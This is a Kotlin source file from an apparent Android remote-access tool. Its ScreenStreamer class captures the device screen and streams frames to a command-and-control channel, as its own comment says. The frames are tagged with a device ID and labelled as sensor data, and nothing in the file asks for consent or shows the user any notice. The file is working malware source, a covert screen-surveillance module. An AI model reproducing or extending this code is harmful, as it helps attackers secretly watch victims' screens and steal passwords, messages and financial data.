// ============================================================
// FILE: android/app/src/main/java/com/xrc/vnc/ScreenStreamer.kt
// ============================================================
package com.xrc.vnc

import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import kotlinx.coroutines.*

/**
 * ScreenStreamer — continuous VNC frame streaming over C2.
 *
 * Wraps VNCController and sends frames as messages.
 * Implements adaptive FPS based on bandwidth and device load.
 */
class ScreenStreamer(
    private val context: Context,
    private val channelClient: ChannelClient,
    private val vncController: VNCController
) {
    companion object {
        private const val TAG = "ScreenStreamer"
        private const val DEFAULT_FPS = 5
        private const val MAX_FPS = 15
        private const val MIN_FPS = 1
    }

    private var isStreaming = false
    private var targetFps = DEFAULT_FPS
    private var scope: CoroutineScope? = null

    /**
     * Start streaming VNC frames.
     */
    fun startStreaming(quality: Int = 50, fps: Int = DEFAULT_FPS) {
        if (isStreaming) return

        targetFps = fps.coerceIn(MIN_FPS, MAX_FPS)
        isStreaming = true

        vncController.startScreenCapture(quality)

        scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope!!.launch {
            val deviceId = Identity.getDeviceId(context)
            val frameInterval = (1000L / targetFps)

            while (isStreaming) {
                val frameStart = System.currentTimeMillis()

                try {
                    val frameData = vncController.getCurrentFrame()
                    if (frameData != null) {
                        val msg = Message(
                            type = Protocol.TYPE_SENSOR_DATA,
                            id = "vnc_${System.currentTimeMillis()}",
                            device_id = deviceId,
                            payload = Protocol.json.encodeToString(
                                mapOf(
                                    "type" to "vnc_frame",
                                    "data" to frameData,
                                    "quality" to quality,
                                    "ts" to System.currentTimeMillis()
                                )
                            )
                        )
                        channelClient.send(msg)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Frame streaming error: ${e.message}")
                }

                // Maintain target FPS
                val elapsed = System.currentTimeMillis() - frameStart
                val sleepTime = (frameInterval - elapsed).coerceAtLeast(0)
                if (sleepTime > 0) {
                    delay(sleepTime)
                }
            }
        }

        Log.i(TAG, "Screen streaming started: ${fps}FPS quality=$quality")
    }

    /**
     * Stop streaming.
     */
    fun stopStreaming() {
        isStreaming = false
        scope?.cancel()
        scope = null
        vncController.stopScreenCapture()
        Log.i(TAG, "Screen streaming stopped")
    }

    /**
     * Adjust streaming quality dynamically.
     */
    fun setQuality(quality: Int) {
        vncController.setQuality(quality)
    }

    /**
     * Adjust FPS dynamically.
     */
    fun setFps(fps: Int) {
        targetFps = fps.coerceIn(MIN_FPS, MAX_FPS)
    }

    /**
     * Check if streaming is active.
     */
    fun isActive(): Boolean = isStreaming

    /**
     * Get streaming stats.
     */
    fun getStats(): Map<String, Any> {
        return mapOf(
            "streaming" to isStreaming,
            "fps" to targetFps,
            "quality" to "adaptive"
        )
    }
}
